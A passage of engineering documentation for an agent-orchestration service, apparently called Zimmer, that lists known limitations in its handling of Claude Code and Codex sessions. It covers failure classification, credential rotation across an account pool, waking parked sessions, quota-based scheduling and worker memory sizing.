| Unparseable tool call → retry with backoff | `/tool call could not be parsed/i`, `/tool call was malformed/i` | `api_error_retry_service.rb` |
| Auth lost → adopt/rotate/wait, respawn, then park | the `error` types `authentication_failed` / `oauth_error`, plus a prose net | `auth_recovery_service.rb` |
| Context overflow → compact and retry | a pattern list | `context_length_retry_service.rb` |
| Corrupted npx cache → delete it | `ENOTEMPTY`, `ERR_UNSUPPORTED_DIR_IMPORT` | `npx_cache_heal_service.rb` |
| Held runtime session id → resume it, or mint a new one | `/session id\b.*\balready in use/i` | `claude_retry_strategy.rb` |

The tool-call row is the one that *cannot* be anything but prose. Claude Code writes its report of an
unparseable tool call as a `<synthetic>` entry with no `error` field at all, so there is no type to
read — the residual risk is the mirror of the others: a genuine API-side error whose prose happens to
mention a malformed tool call gets retried six times before it pages, instead of paging at once. See
[Spawning](/sessions/spawning/#not-every-api-error-in-the-transcript-is-the-api).

This has already caused an outage. When Claude Code's wording changed, account rotation stopped firing:
the session fell through to the transient-rate-limit path, retried six times against an already-capped
account, and failed, with no log line saying rotation should have happened.

The matching is still prose-based — that part has not changed, and a *mis*match (prose that hits the
wrong pattern, as in that outage) still looks like an ordinary classification. What no longer happens
silently is a **no**-match: when a session dies and not one classifier recognized it,
`UnclassifiedFailureReporter` logs loudly and pages `#alerts` with the unmatched stderr and
transcript text, so the next wording change surfaces as a Slack message rather than an
archaeology session. The same reporter fires when a classifier and its recovery service disagree
about the same exit.

The normal-completion branch is covered too. Claude exits 0 or 1 for a finished turn, so an exit
there is the one a stale classifier can hide behind — on 2026-08-20 a reworded auth failure ended
production session 6412 that way and left a human's message unanswered with nothing but the
transcript to find it by. `handle_exit` therefore asks a last question with no prose in it: *is the
last conversational entry in the transcript an API error?* If it is, the turn did not complete
however the runtime worded it, and the session fails — with the unmatched text in an alert when the
wording is one nothing recognises — rather than parking as finished. See
[Agent harness auth](/auth/harness/#a-turn-that-dies-on-an-api-error-can-never-look-finished).

Two gaps remain inside that, deliberately. A stale classifier still costs a **failed session** rather
than the recovery it should have got: the held-session-id row above is one of those — Claude reports
that refusal with exit 1 and writes nothing to the transcript at all, so no terminal API error exists
for the backstop to see and the only state check that catches it is the empty-turn restart (see
[Spawning](/sessions/spawning/)), which covers the first turn of a session and not a later one. The
second gap is that `runtime_classifies_exits?` — the guard that withholds the page from a runtime
whose strategy classifies nothing, because paging on a runtime's designed-for path is how a channel
gets ignored — now has no runtime answering `false`. Claude, Codex (#54) and Pi (#856) all classify
their exits from evidence the runtime itself records, so an unclassified exit on any of the three
pages. The guard stays for the next runtime to land before its failures are characterized, which is
the state both Codex and Pi were in.

Tracked in [#53](https://github.com/tadasant/zimmer/issues/53).

### Telling you the pool is dead requires the pool

🟡 `needs_reauth` is reported by emitting the `account_needs_reauth` Zimmer event, which fires a
Trigger, which spawns a `general-agent` session holding the `slack-workspace` MCP server to send the
DM ([a dead account tells you so](/auth/harness/#a-dead-account-tells-you-so)). Spawning that session
needs a working account.

One dead account among six is fine — the pool rotates and the notifier session runs on any of the
others. A pool where *every* account is dead cannot spawn the session that would say so. Two things
bound it rather than fix it: the seeded trigger is `priority` rather than the `spot` that `ao_event`
derives, so the one session whose job is to report a dead pool is not itself gated behind a healthy
account under quota; and when the spawn fails anyway, `AoEventTriggerJob#handle_fire_failure` raises
an `#alerts` post, which needs no account at all.

So the floor is a channel post rather than a DM. That is a real downgrade — a feed entry you scroll
past instead of a nag aimed at the person who can fix it — but it is not silence, and it is strictly
better than the native DM path it replaced, which failed silently for three different
configuration reasons — an unset `OPERATOR_SLACK_USER_ID`, a bot without the `im:write` scope
`conversations.open` needs, and a stuck dedup key — none of which any health check looked at.

### Auth recovery can rotate away from an account that was fine

🟡 `AuthRecoveryCoordinator` reacts to the runtime saying "Not logged in" by moving the pool — it
rotates away from the identity that failed rather than re-injecting it (that re-injection loop is
what made the message user-visible three times in a row; see
[Agent harness auth](/auth/harness/#the-recovery-decision-tree)). But "Not logged in" carries no
structured reason, so the coordinator cannot always know *why* the identity failed.

It probes the outgoing account's refresh token before rotating, which separates a dead credential
(`needs_reauth`) from a live one, and it takes a live quota reading on the way past. Those are enough
to get the **park reason** right, and enough that a rotation no longer invents a `quota_exceeded`
label out of nothing — an account rotated past on `auth_recovery` whose reading is clear stays
`active` ([A rotation is not evidence about quota](/auth/harness/#a-rotation-is-not-evidence-about-quota)).

What remains, in three parts. The session still rotates away from an account that may have been
fine, so the pool moves for a rejection Anthropic might have served on the next call — that costs
the *session* a re-spawn and moves everyone else onto a different identity, but it no longer costs
the account its place in the pool. Because the account keeps that place, it is also the top-priority
candidate for the *next* rotation, so an account the runtime keeps rejecting while its credential
refreshes cleanly can be handed back and forth; per session that is bounded by
`AuthRecoveryService::MAX_RECOVERY_ATTEMPTS`, but nothing bounds it across sessions, and there is no
cooldown on a recently-rotated-away account. And when the reading genuinely does say a window is
spent, the label outlives the evidence — Claude's windows slide, so the account is servable again
before `QuotaResetCheckerJob`'s next sweep restores the column, up to 15 minutes of a healthy account
sitting out. The park decision and `auth_health` look past that last one ([One predicate for "is the
pool drained"](/auth/harness/#one-predicate-for-is-the-pool-drained)); the paths that pick an account
to spawn with do not, deliberately.

That is the deliberate trade: an unnecessary rotation costs one session a re-spawn, whereas
re-injecting a dead identity costs the user three visible auth failures and a park with the wrong
instruction, and a fabricated `quota_exceeded` costs the whole pool an account. Worth revisiting if
Anthropic ever exposes a structured reason.

### An Anthropic outage makes the account probes inconclusive, and they promote anyway

🟡 Bootstrap, rotation and the UI login flow all validate an account before promoting it by probing
Anthropic with its access token (`QuotaCheckService::Result#rejected?`, see
[Bootstrap validates before it promotes](/auth/harness/#bootstrap-validates-before-it-promotes)).
The probe distinguishes three answers, and only *Anthropic answered and refused* condemns an account.
A probe that never reached Anthropic — timeout, DNS failure, 5xx — is treated as no evidence, and the
candidate is promoted unvalidated.

That is the deliberate direction. The alternative reads a provider outage as "every credential in the
pool is dead" and parks every session at once, which is a worse and much less recoverable failure than
promoting one account that may or may not work. The consequence to know about: during an Anthropic
outage, bootstrap gives you exactly the behaviour it had before this validation existed.

The same asymmetry applies to `ClaudeLoginDriver#capture!` — a login completed while Anthropic is
unreachable is stored rather than thrown away.

### A card can read "not yet checked" for an account that is perfectly healthy

🟡 `/inference` reports what the last probe learned about the access token **currently** in the row,
and a refresh writes a new one — so every proactive token refresh retires the verdict and the card
falls back to *"Credentials stored, not yet checked against Anthropic."* until something probes again.
For the serving account that is the next `ClaudeUsageSamplerJob` tick (15 minutes); for a spare it can
be up to `SPARE_MAX_STALENESS` plus a tick, around 75 minutes. Pressing the card's refresh button
probes immediately.

That is the deliberate direction: the alternative is a card that keeps saying *"verified"* about a
token that no longer exists, which is the class of claim this replaced. "Unverified" is never a claim
that anything is wrong — only `:rejected` is — and the pool treats it as serviceable, so nothing
parks over it. See [Stored is not verified](/auth/harness/#stored-is-not-verified).

### A capped account is marked from whichever reading happens to arrive first

🟡 An account leaves the pool when a quota reading says its weekly window is spent
([#248](https://github.com/tadasant/zimmer/issues/248)) — and readings arrive from unrelated places:
a rotation snapshot, a `/inference` page view, the 15-minute reset checker. So *when* a capped account
gets marked depends on when someone last looked at it, not on when it filled its window. An idle pool
that nobody has probed can still hand out an account whose week ran out an hour ago; rotation's own
pick-time check only fires on evidence that already exists.

The floor is `QuotaResetCheckerJob`'s 15-minute sweep, which probes `quota_exceeded` accounts — but
not `active` ones. The two paths that actually hand an account to a session close the gap for
themselves: bootstrap probes each candidate live before promoting it, and rotation snapshots the
account it activates. What is left is the window in between, where `/inference` can show an account as
healthy on evidence that has gone stale. Making that deterministic would mean probing every active
account on a schedule, which costs a request per account per sweep for a condition the paths that
matter already check at the moment they matter.

### A deleted account's quota snapshots are kept forever

🟢 Deleting a `ClaudeAccount` detaches its quota snapshots rather than destroying them, so the
evidence of how the account behaved survives the delete-and-re-authenticate loop
([#241](https://github.com/tadasant/zimmer/issues/241), and
[Deleting an account keeps its history](/auth/harness/#deleting-an-account-keeps-its-history)). The
cost is that the delete used to be the only thing that ever removed a snapshot:
`claude_account_quota_snapshots` has no prune job, for live accounts either. A detached reading is
therefore permanent unless `claude_accounts:clear_all` takes it, and nothing reads it — the rate
metric skips detached rows on purpose, and `/inference` only ever looks up snapshots by live account id.

Small in practice: snapshots are written on rotation, on a `/inference` view, and by the reset checker,
so the table grows at operator pace rather than at session pace. The honest fix is a retention job
for the whole table, not a carve-out for orphans — deleting exactly the rows this change exists to
preserve would undo it.

Login attempts are the opposite shape and worth not confusing with this: `CleanupRuntimeLoginAttemptsJob`
hard-deletes every terminal attempt after a day, detached or not, so that history outlives its
account by at most 24 hours.

### An account whose label has drifted is back on the page before it is back in the pool

🟡 `/inference` derives the badge it shows for an account from that account's own latest reading
(`ClaudeAccount#effective_status`, see
[The status column is sticky](/auth/harness/#the-status-column-is-sticky-the-badge-on-inference-is-not)),
so a cleared account stops presenting as "Quota Exceeded" the moment a reading says so. The
`status` column it is derived *around* is what `ClaudeAccount.available` and `AccountRotationService`
read, and that still only changes when something writes to it: `QuotaResetCheckerJob`'s 15-minute
sweep, or `InferenceController#auto_heal_accounts` on a page load or refresh.

So there is a window where the page tells the truth and the pool has not caught up — an account
displayed as Active that rotation would still skip. It closes on the next sweep, or immediately if
you are the one looking at the page, since loading it heals. Making the pool itself derived would
mean joining every availability check to the latest snapshot per account and acting on a reading
that may be minutes old, which is the wrong trade for the path that hands an identity to a session.

Two edges of the same asymmetry are worth knowing. A page load restores the **account** but does not
resume the sessions parked on it — only `QuotaResetCheckerJob` calls
`AuthOutageParkService.wake_parked_sessions!`, so those sessions wait for the sweep or their own
timer. And the derivation needs a reading to work from, which a **Codex account has only when Codex
recorded one with the refusal** — see [A Codex quota refusal with no rate-limit reading is never
restored automatically](#a-codex-quota-refusal-with-no-rate-limit-reading-is-never-restored-automatically).
Without it, a Codex account marked `quota_exceeded` on rotation keeps the label and stays out of its
pool until someone re-activates it.

### The Inference page can hold row-lock transactions across a token endpoint call

🟡 `ClaudeAccount#refresh_token!` serializes on the account row and keeps that lock for the whole
read-refresh-persist sequence, HTTP included (see
[Refreshing a token without burning it](/auth/harness/#refreshing-a-token-without-burning-it)). That
is what makes the token it presents provably the token it holds, and it was already the shape of the
5-minute sweep, which wrapped each refresh in `account.with_lock` before this.

What is new is that the same lock now applies on the **web** tier. `InferenceController` refreshes to
validate an account before switching, and its probe can call `refresh_token!` more than once per
account per render — so rendering `/inference` while Anthropic's token endpoint is slow holds a
sequence of transactions, each up to the 5s-open/10s-read timeout, on a Puma thread.

Tolerable because the page is operator-facing and rarely loaded, and because the alternative — an
unserialized refresh — is the bug that drained the pool. If it becomes a problem the fix is a
`lock_timeout` on the refresh path rather than dropping the lock.

### A stale spawn identity can cost one extra respawn

🟡 `metadata["auth_identity_email"]` is what
[the recovery decision tree](/auth/harness/#the-recovery-decision-tree) compares against the pool's
current account to tell *the pool moved under me* from *I am holding the identity that failed*. It is
written per session — at spawn, and whenever the coordinator or the quota path moves that session —
so it goes stale when the pool moves for a reason this session was not part of: another session's
rotation, or an operator switching accounts from the Inference page.

A session whose record says account A, and which has since been running on account B, will read a
genuine "Not logged in" from B as *the pool already moved off A* and adopt B — the identity it was
already using. It re-spawns once into the same wall.

It self-corrects rather than looping: adopting rewrites the record to B, so the next failure takes
the rotate branch for real. The cost is one wasted respawn and one misleading log line, against a
prior behaviour of three. The rotation-collapse path avoids the same trap with a recency gate
(`AccountRotationService::COLLAPSE_WINDOW`, 60s) — a rotation older than that is the account the
caller has been living with, not a stampede to ride.

### A rotation that wedges makes other sessions wait, then guess

🟡 The pool lock (`ClaudeAccount.with_pool_lock`) is a session-level Postgres advisory lock, so it
is released if the holder's connection drops — a crashed worker cannot deadlock the pool. A holder
that is *alive but stuck* (a hung HTTP token refresh, say) is different: other sessions wait
`POOL_LOCK_WAIT` (45 s), then give up and take the `rotation_in_flight` branch, which re-spawns
against whatever credentials are on disk and charges an attempt. That is the right guess most of the
time — the stuck holder is mid-rotation and its credential write has probably landed — but it is a
guess, and three of them exhaust the session's budget and park it.

There is no visibility into *which* session holds the lock; the only signal is the
`"Pool lock held past the wait"` warning in the waiting session's logs.

### A parked session waits for one event, and only that event

🟡 When the login pool runs dry, `AuthOutageParkService` parks the session and creates nothing — no
timer, no per-session trigger (see [Agent harness auth](/auth/harness/#when-the-pool-runs-dry)). What
wakes it is the `quota_available` edge, fired once per recovery, which spawns one fleet-maintenance
session that starts spot work in precedence order. Parked **priority** sessions keep a direct sweep
of their own every fifteen minutes. `AuthOutageWakeAuthority` is what says which park is whose, and
the 15-minute sweep asks for a fleet wake on behalf of the parks it left alone — so a spot session
the fleet wake did not reach is re-asked for hourly rather than waiting for the pool to exhaust and
recover again.

That removes the wake → fail → re-park cycle the timers produced, and with it the dozens of
`Auth outage retry for session #N` rows the trigger list used to carry. It also concentrates the
whole spot wake into one event, and the sharp edges are all about that concentration:

- **A missing or broken fleet trigger stalls the whole spot queue.** The trigger is seeded by a
  migration and points at the `fleet-maintenance` agent root; if it is deleted, disabled, or its root
  does not resolve, no spot session wakes. A fire that delivers no session **re-arms** the edge
  (`QuotaAvailabilityMonitor.rearm!`) so the next sweep tries again rather than spending the one
  chance — but a permanently broken trigger is a permanently stalled queue, visible only as spot
  sessions sitting in `waiting`.
- **The trigger defers to its own pending session, and a stuck one holds the queue.** The seeded
  trigger has [`skip_if_pending_session`](/sessions/triggers/#skip-while-a-session-is-still-pending)
  on, because the fleet session it spawns is itself parked by the exhaustion it exists to answer —
  without it, every recovery stacked up another sibling carrying the identical prompt (102 sessions
  on the trigger, ten of them in one afternoon). The cost is that a fleet session which never takes
  its turn and never leaves `waiting` suppresses every later wake, and unlike a broken trigger this
  one re-arms nothing: a skip counts as handled, deliberately, or the edge would be spent and put
  back on every sweep forever. Archiving or failing the stuck session releases it, and the trigger
  page names the session it is deferring to.
- **An auth park is woken by different evidence than a quota park**, and only the quota one has an
  edge of its own. `accounts.available` never goes false→true for a rejected identity, so a *spot*
  session parked `auth_unrecoverable` is woken only because the fifteen-minute sweep notices its pool
  fingerprint changed and asks for the wake on its behalf. Between sweeps it waits.
- **A spot park the fleet wake did not reach waits up to an hour, not up to the next outage.** The
  edge is spent once the fleet session has run, and whatever it left behind has no wake path of its
  own. The sweep re-asks every fifteen minutes, but `QuotaAvailabilityMonitor` will only announce an
  already-spent recovery again once it has stood for `ANNOUNCEMENT_STALE_AFTER` (1 hour) and the spot
  gate is not holding for *any* reason. That bound is deliberate — a shorter one spawns a fleet
  session per sweep — but it is a bound, and a deployment sitting permanently at its utilization
  limit still defers indefinitely, because none of those sessions could have started anyway.
- **The other half of the boundary lives in a different repository.** The
  `awaken-waiting-sessions` skill is what the fleet-maintenance session runs, and it ships from
  `tadasant/tadasant-internal`, not from here. Zimmer states the ownership boundary in
  `get_session` and `quick_search_sessions` and honours it in its own sweep; it cannot enforce it on
  the skill, which is free to restart any `waiting` session through the same MCP surface a human
  uses. A skill that ignores the **Woken by:** line reproduces
  [#617](https://github.com/tadasant/zimmer/issues/617).
- **The fingerprint is coarse in both directions.** It cannot see an outage that heals on Anthropic's
  side without touching an account row, and it fires on credential changes that are not repairs at
  all — the five-minute `sync_current_account_tokens!` adopting a token the CLI rotated on disk moves
  the same digest. `MAX_EARLY_WAKES` (3) per `EARLY_WAKE_WINDOW` (6 h), deliberately not reset by a
  re-park, is what makes that survivable rather than exact. Past the budget the session stays parked
  until a human resumes it or the pool changes enough for a later sweep to grant one.
- **Codex has no quota API**, so a parked Codex session is never woken by a quota edge at all — its
  pool is read for availability only.
- **`auth_outage_pool_recovers_at` is an estimate, not a schedule.** It is derived from
  `ClaudeAccountQuotaSnapshot#reset_5h` / `reset_7d` for a quota park, shown in the banner, and read
  by nothing.
- **A window at its utilization limit defers the wake for as long as it holds.** The edge fires only
  when the pool has recovered *and* no quota window is holding spot work at `at_utilization_limit`,
  because starting spot work is all the fleet session can do — see [When the pool runs
  dry](/auth/harness/#when-the-pool-runs-dry). The deferral is re-asked every fifteen minutes and
  costs no edge, but a weekly window whose spot budget is spent holds for days, and every parked spot
  session waits out that whole stretch. That is the correct outcome — none of them could have
  started — and it is still a wake that does not happen. Parked *priority* sessions are not affected:
  the same sweep resumes them directly.
- **The deferral is a spot-shaped precondition on an event anyone can listen to.** `quota_available`
  is a user-configurable `system_event`, and the check is applied when the event is *fired*, not per
  listener. An operator trigger that listens on it to do **priority** work is therefore deferred by
  the spot gate too, even though nothing would have held that work — the event's contract is now "the
  pool recovered and spot work can run", and there is no way for a trigger to opt out of the second
  half. The shipped `fleet-maintenance` wake is the only listener on this deployment, so today this
  costs nothing.

### The starvation lane bounds a turn's wait, not a session's — and it is a hole in the budget

🟡 A spot session the gate has refused for longer than the
[starvation age ceiling](/sessions/spot-and-priority/#a-hold-has-an-age-ceiling-the-starvation-lane)
is admitted past a spent or over-paced quota window, one session at a time, for that one turn. That
is deliberately a hole in the budget ceiling the gate enforces, and its edges are all consequences
of keeping it small:

- **The bound is per turn.** A session whose every turn is held waits up to the ceiling before
  *each* of them: the admission clears the hold record, and the next turn's hold starts a fresh
  ladder with a fresh clock. A long-running spot session under a spent week therefore gets one turn
  a day, not one turn and then free passage.
- **The lane is one session wide, so the ceiling is a floor on the wait, not a guarantee.** With
  thirty starved sessions and an ~80-minute turn each, the thirtieth waits the ceiling *plus* about
  forty hours for the lane. That is the trade: widening the lane would widen the hole by the same
  factor, and the number is a constant (`SpotSessionHold::STARVATION_LANE_WIDTH`) rather than a
  setting for that reason.
- **The admitted turn runs to its end, however long that is.** The ceiling sweep leaves it alone,
  so a starvation-admitted implementation session that runs for six hours holds the lane for six
  hours. Priority preemption can still take its slot, and if it does the session goes back to the
  paused queue and waits on the ordinary resume decision — the lane does not reach into that queue,
  and the admission already cleared the session's ladder, so once it is resumed and held again it
  starts a fresh ceiling from zero.
- **Only `at_utilization_limit` is overridden.** A session held for `fleet_at_cap` waits without
  bound, because that hold is priority work crowding spot work out and clears on its own; a fleet
  that is permanently full of priority work starves spot work by design.
- **A ladder that predates `spot_hold_since` starts its clock at its last pre-deploy rung.** The
  wait before it is not on the record anywhere the gate can trust — `created_at` would let a Restart,
  which clears the ladder, walk straight into the lane — so a session already days deep at deploy
  time waits a further full ceiling from that rung, once.

### The idle-fleet event is sampled, floored and cooled down, and each of the three has an edge

🟡 [`no_sessions_in_progress`](/sessions/triggers/#no_sessions_in_progress) fires when the deployment
has been running fewer sessions on a worker than its configured ceiling for the whole of its
configured stretch.
Idleness is a level rather than an edge, so `FleetIdleMonitor` manufactures one — and the machinery
that does it has known limits:

- **It is sampled once a minute, so the clock starts up to a tick late.** `fleet_idle_since` is
  written at the first observation under the ceiling, not at the moment the fleet crossed it, so "five
  continuous minutes" is really "five minutes since we noticed", ±60 seconds. The
  `SessionStateMachine` hook closes the opposite gap — a fleet that fills up and empties again between
  two ticks still ends its stretch — but nothing narrows the start. It is also why the stretch cannot
  be set below a minute.
- **The cooldown is the only thing pacing a fleet that never reaches its ceiling, so the threshold
  stops mattering after the first fire.** The idle stretch runs on *through* a fire — only the fleet
  reaching its ceiling ends one — so on a deployment whose ceiling it never touches, every fire after
  the first is timed by `fleet_idle_min_fire_interval_minutes` alone and the stretch has nothing left
  to say. That is deliberate (it is what stops the event re-qualifying itself on the session it just
  spawned), but it means lowering the threshold on such a deployment changes only when the *first*
  top-up lands, not the cadence. The number to retune is the interval.
- **A backed-up spot queue no longer holds it off at all.** Only sessions a worker is running count
  toward the ceiling, so the event can fire — spawning a **priority**, ungated session — while any
  number of spot sessions sit held or paused behind the gate. That is deliberate: the spawned session
  fills an idle machine rather than joining the queue, and the gate is what paces spot work against
  the budget. The cost is that top-up work is always the work that jumps the queue, so a deployment
  whose backlog is mostly spot sees priority sessions started ahead of it while the gate holds. There
  is no signal on either side: the top-up trigger cannot see how deep the spot queue is, and the gate
  does not know a top-up is coming.
- **Neither ceiling can be reached above `GOOD_JOB_AGENTS_THREADS`, and nothing stops you setting one
  there.** Both count only the turns a worker is *executing*, and the `agents` GoodJob lane is only
  `GOOD_JOB_AGENTS_THREADS` (default 12) deep, so a ceiling of 15 on a pool of 12 is a ceiling the
  fleet can never touch: the spot gate never reports `fleet_at_cap`, and top-up always sees the fleet
  as having room — while work keeps queueing behind the same twelve workers. The setting is
  deliberately not clamped (the operator's number is theirs, and growing the pool is a deploy away),
  so the mitigation is disclosure: both `/inference` cards and `get_spot_policy` say the ceiling is
  out of reach and print `min(configured, GOOD_JOB_AGENTS_THREADS)` beside it. What that leaves is a
  deployment whose only real concurrency control is the size of the worker pool — the quota ceilings
  still pace spot spend, but the slot ceiling does nothing until you lower it under the pool.
  **Both shipped defaults sit under the pool and therefore bind:**
  `spot_max_concurrent_sessions` defaults to 10 and the top-up ceiling to 3, both under a pool of 12,
  so an un-retuned deployment gets ceilings that actually bind. A deployment that had *raised* its
  ceilings to work around the old 8 — Tadasant production ran 15 — should bring them back under the
  pool, or it keeps the unreachable-ceiling behaviour this bullet describes for no reason.
- **The pool is bounded by memory, and raising it does not buy the memory back.**
  `GOOD_JOB_AGENTS_THREADS` is sized by what the `sessions` cgroup pool can hold, not by the
  database — each thread runs a whole agent session. The history is worth keeping because the
  intuition it corrects is a common one. Over the 24 hours to 2026-09-05T14:16Z, at 8 threads and
  *before* [#981](https://github.com/tadasant/zimmer/issues/981)'s fix, the worker cgroup's **`anon`**
  — unreclaimable, so it is what decides whether N sessions fit — peaked at **9.07 GiB against a
  10 GiB `memory.max`**, with real `oom_kill`s. Eight *in-budget* sessions, no runaway, largest
  process 943 MB, summed over the container cap and the kernel killed the GoodJob worker itself,
  taking every in-flight `AgentSessionJob` with it.
- **What that fix changed is the victim, not the demand — and that is what made 12 shippable.**
  Session cgroups now sit in a `sessions` pool carrying its own `memory.max`
  (`ZIMMER_SESSIONS_MEMORY_MAX_MB`, 6144), and the Rails worker sits in an `app` sibling *outside*
  it. A pile-up therefore declares its OOM in a cgroup the worker is not in: one session dies with
  an attributable cause and a retry, rather than all of them plus the worker. Because that pool cap
  is absolute, **admitting more sessions cannot endanger the worker through session memory** — it
  spends pool headroom instead. That is why the thread count could go 8 → 12.
- **Read that narrowly, because one path is outside the pool.** It covers the session process and
  its descendants, which `SessionMemoryCgroup`'s `sh` wrapper puts inside the pool. It does **not**
  cover what a session starts through the **inner dockerd**: `bin/docker-entrypoint` runs the cgroup
  delegation *after* the dockerd block on purpose, so the daemon and the `.agent-containers` dev
  stacks it manages stay in the container cgroup — alongside the worker, in the victim set the
  container cap selects from. That path is bounded by `GOOD_JOB_AGENTS_THREADS` and nothing else,
  and raising the thread count raises the number of sessions that can hold a stack at once. It is
  the residual risk in this ceiling. Measured live, dockerd plus its stacks was 63 MB against a
  4096 MB residual, so there is real room — but the term is not capped, and a fleet that leans on
  nested Docker should re-derive it rather than assume this measurement.
- **The counter-intuitive part: do not raise the pool to match the threads.** The pool is sized from
  what must survive a pile-up, not from how many sessions are admitted. Two tenants live outside it
  and both must fit in the residual — the Rails worker (~1.6 GiB measured) and the inner dockerd
  with the dev stacks it runs (~1.5 GiB), about 3.1 GiB together. At 6144 the residual is 4096 MB
  and covers that; at 7168 it would be 3072 MB, *under* the measured need, so the **container** cap
  would fire first — and that OOM selects across the whole container and takes the worker, which is
  #981 recurring with the new mechanism working exactly as designed. The pool must fire first.
- **So what 12 actually costs is concurrent-heavy-work headroom.** Measured on the live worker at 12
  session cgroups: pool `anon` 3154 MB of the 6144 cap, ~263 MB per session, leaving ~3.0 GB —
  roughly five concurrent capped test suites at ~560 MB each. The conservative per-session figure
  from #981's peak task dump (~382 MB) would leave ~1.6 GB, or two to three. The real tolerance is
  somewhere in that band and has not been pinned down; past it the pool kills one session. Connections
  are not what binds first, but they are not roomy either: 12 threads derive 91 required backends
  against the 97 a `db-s-2vcpu-4gb` cluster serves, and 15 would derive exactly 97 — the entire plan,
  zero margin. A self-hosted deployment with a different worker cap has a different number, arrived
  at the same way.
- **A turn is queued for a worker for as long as the `agents` lane is deep, and only the session
  page says so.** Since [#1040](https://github.com/tadasant/zimmer/pull/1040) that turn reads
  `waiting` rather than `running`, so the dashboard count and `/inference`'s ceiling agree — but
  `waiting` is a state with four meanings (a spot hold, a ceiling pause, a quota park, a queued
  turn), and only the session detail page and `get_session` name which one. A session list showing
  forty `waiting` rows does not distinguish the ones about to run from the ones parked for hours.
- **A `running` row asleep on its own wake is dropped from both ceilings, and nothing puts it back
  into `waiting`.** When a turn ends with something already in flight for the session — a queued
  message the handoff path picks up, or a recovery job — the row can stay `running` while the session
  sleeps. Once nothing is left queued for it the ceilings stop counting it, which is the fix in #957,
  but the row itself still reads `running` on the dashboard and in every status query until its wake
  fires. #1040 narrowed this — the enqueued-message handoff now returns the session to `waiting`
  when it hands the next turn to the queue — without closing it: a turn that ends with a *recovery*
  job already in flight still leaves the row `running`. The counting is right; the status is still
  misleading in that residue.
- **The cooldown is the real cap on top-up frequency, and it is a blunt one.**
  `fleet_idle_min_fire_interval_minutes` exists because the session the event spawns is itself work on
  the fleet, so a cadence that consulted the fleet would let the event re-qualify itself and a quiet
  deployment would get one spawn every stretch, forever. The idle stretch runs on *through* a fire —
  only the fleet reaching its ceiling ends one — so the cooldown, not the ceiling and not the stretch,
  decides the cadence: 60 minutes means at most 24 top-ups a day. It is tunable, but it is still a
  fixed floor rather than anything derived from how much work is actually queued, and it applies even
  when the previous fire delivered nothing.
- **A fleet that flaps across its ceiling never accumulates a stretch.** The dwell has to be
  *continuous*, and both the sweep and the state-machine hook end it the moment the fleet is at or
  over the ceiling. A deployment that keeps touching its ceiling and dropping back more often than
  every `fleet_idle_threshold_minutes` therefore never fires, however much headroom it has on average.
  Churn *under* the ceiling is not flapping and costs nothing — that is the point of the ceiling — but
  a ceiling set at or just above the fleet's usual peak turns ordinary variation into flapping.
- **A single fire tops up by one session, whatever the headroom.** The event says "there is room",
  not how much: a fleet at 1 of 10 and a fleet at 2 of 3 produce the same one fire, and filling eight
  free slots takes eight cooldowns. `FleetTopUpStatus#headroom` reports the number on `/inference` and
  in `get_spot_policy`, but nothing acts on it — the event carries no "how many" and the trigger that
  listens spawns one session per fire.
- **The three conditions are not equally legible.** `/inference` reports the ceiling, both clocks and
  which of the not-fired-yet states the fleet is in, and `get_spot_policy` prints the same. The
  auth-outage park and the pool reading are *not* in that card — they are reported elsewhere on the
  page, in their own words, so "under the ceiling but still not firing" takes two readings to
  diagnose. Neither is on `/health` or in `get_system_health`.

### Codex failure classification rests on one CLI version's record

🟡 `CodexRetryStrategy` classifies a failed Codex turn by the `codex_error_info` code Codex writes on
the rollout's `task_complete` record (see [Agent harness](/extend/agent-harness/#codex-classifies-by-the-code-it-records)).
Every code and message it reads was produced by codex-cli 0.146.0 against a local fake of the
ChatGPT backend — not captured from a production failure — and over the HTTPS transport, because
the fake refused the WebSocket upgrade. A Codex release that renames a code, or a backend that
reports a failure under a code the fake never produced, turns a recoverable exit into an
unclassified one.

That is loud rather than silent: `classifies_exits?` is `true` for Codex, so an exit none of its
classifiers claims fails the session **and** raises `UnclassifiedFailureReporter` with Codex's own
message attached. A burst of those after a Codex upgrade means the table in `CodexTurnError` needs a
new row. A failed exit whose turn error some recovery already acted on — its replacement died before
writing a turn of its own — fails the session naming that error, without a page.

What the classifiers deliberately do not cover:

- **An `other` code with no HTTP status in its prose** (a raw 400 body, "Error running remote
  compact task", …) is unclassified. Two exceptions: a raw 400 whose body names the API's
  `"code": "context_length_exceeded"` routes to compaction, and "stream disconnected before
  completion: …" — how Codex words a stream that closed early or a connection that was refused —
  is retried.
- **Codex's other structured codes** — `sandbox_error`, `bad_request`, `session_budget_exceeded`,
  `cyber_policy`, `thread_rollback_failed` and the rest of the enum in the binary — are unclassified.
  None of them is a condition a respawn fixes, so failing and paging is the honest answer.
- **`usage_not_included`** ("To use Codex with your ChatGPT plan, upgrade to Plus") shares
  `usage_limit_exceeded` with a spent quota, so it rotates like one. It carries no rate-limit
  reading, so it is recorded as a refusal with no reset and the account is not restored
  automatically — which is right, because waiting does not fix it.
- **A 429 that is really an exhausted API-key quota** reads as `response_too_many_failed_attempts`
  with status 429 — the same as a transient rate limit — so it is retried six times with backoff
  before the session fails.
- **Codex 429s do not count toward `GlobalRateLimitTracker`, and Codex backoff does not read it.**
  That tracker is the fleet's measure of pressure on the Anthropic API and every Claude session's
  backoff reads it; an OpenAI rate limit says nothing about it, and nor does Anthropic pressure say
  anything about a Codex retry.
- **Nothing reads Codex's stderr for these classifiers.** It is Codex's tracing log, full of WARN
  lines quoting upstream errors Codex went on to retry past. Only the failed-resume signature
  (`no rollout found`) is still a stderr match.

### A Codex quota refusal with no rate-limit reading is never restored automatically

🟡 `QuotaResetCheckerJob` restores a `quota_exceeded` Codex account on the reading kept when Codex
refused it — the `x-codex-primary-*` / `x-codex-secondary-*` windows Codex writes on the failed
turn's `token_count` record, kept as a `usage_limit` quota snapshot with the capped windows marked
`rejected`. Every refusal writes one, so the newest snapshot always describes the newest refusal.
A refusal that came with no windows, with no window at its cap, or with a capped window and no reset
time is written as a refusal of the five-hour window with no reset: it never reads as clear, so
neither the sweep nor the `/inference` heal restores the account, and it stays `quota_exceeded`
until someone re-activates it on `/inference`.

Codex's primary window is stored in the snapshot's five-hour columns and its secondary window in the
weekly ones. The restore predicate (`windows_clear?`) reads reset times and counters, not window
lengths, so the naming does not change its answer. `/inference` does not draw a Codex account's
windows at all — its card still reads "no usage quota tracked" — so the reading is visible only in
the account's status badge (which, as for Claude, derives from it) and in the restore.

### A fresh-started Codex session has no runtime id until its first poll

After a failed resume, `ProcessLifecycleManager#release_stale_runtime_session_id!` clears
